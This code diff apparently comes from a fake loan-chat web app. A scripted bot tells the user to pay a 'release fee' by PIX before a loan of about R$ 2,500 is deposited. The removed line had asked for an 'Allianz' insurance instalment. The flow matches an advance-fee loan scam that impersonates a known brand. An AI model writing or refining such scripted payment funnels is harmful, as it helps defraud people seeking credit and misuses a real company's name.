@@ -1220,13 +1220,15 @@ const Chat = () => {
                   <button
                     onClick={() => {
                       setTaxaConfirmed(true);
+                      setPaymentPhase("taxa");
+                      setPixPaid(false);
                       setTimeout(() => {
                         setMessages((prev) => [...prev, { id: Date.now(), text: "Prosseguir com a taxa de liberação!", fromUser: true, time: getNow(), read: true }]);
                       }, 300);
                       setTimeout(() => {
                         addBotMessages(() => [{
                           id: Date.now() + 2,
-                          text: `Perfeito, ${firstName || "cliente"}! Para ativar o Seguro Prestamista Allianz, realize o pagamento da primeira mensalidade no valor de R$ 34,90.\n\nApós a confirmação do pagamento, sua cobertura será ativada imediatamente.\n\nO valor do empréstimo será depositado em até 5 minutos na conta informada.`,
+                          text: `Perfeito, ${firstName || "cliente"}! Para liberar o valor de ${formatCurrency(loanDetails?.valor || 2500)} na sua conta, realize o pagamento da taxa de liberação.\n\nApós a confirmação, o crédito será depositado em até 24 horas.`,
                           fromUser: false, time: getNow(), read: true,
                         }]).then(() => {
                           generatePixPayment();
